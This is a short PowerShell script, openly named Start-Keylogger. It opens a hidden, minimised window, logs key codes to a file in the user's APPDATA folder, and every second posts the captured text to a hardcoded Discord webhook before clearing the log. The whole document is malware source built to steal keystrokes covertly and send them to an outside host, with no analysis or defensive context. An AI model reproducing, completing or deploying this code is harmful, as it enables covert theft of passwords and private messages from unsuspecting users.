$webhookURL = "https://discord.com/api/webhooks/1211338209254965258/ZN2Rfn2AO6KKLW5FRl9UXaoqHJv2brSA-G6-L7gS9HKkRCKY2-NG1N7YbXU6ixZ6FzPk"

function Start-Keylogger {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object Windows.Forms.Form
    $form.Topmost = $true
    $form.WindowState = "Minimized"
    $form.ShowInTaskbar = $false

    $textBox = New-Object Windows.Forms.TextBox
    $form.Controls.Add($textBox)

    $timer = New-Object System.Windows.Forms.Timer
    $timer.Interval = 1000
    $timer.Add_Tick({
        $log = Get-Content "$env:APPDATA\keylog.txt" -Raw
        if ($log -ne "") {
            Invoke-WebRequest -Uri $webhookURL -Method POST -Body "{'content':'$log'}" -ContentType 'application/json'
            Clear-Content "$env:APPDATA\keylog.txt"
        }
    })

    $form.Add_Shown({$textBox.Focus()})
    $form.Add_KeyDown({
        Add-Content "$env:APPDATA\keylog.txt" ([char]$_.KeyCode)
    })

    $form.Controls.Add($timer)
    $timer.Start()

    [Windows.Forms.Application]::Run($form)
}

Start-Keylogger
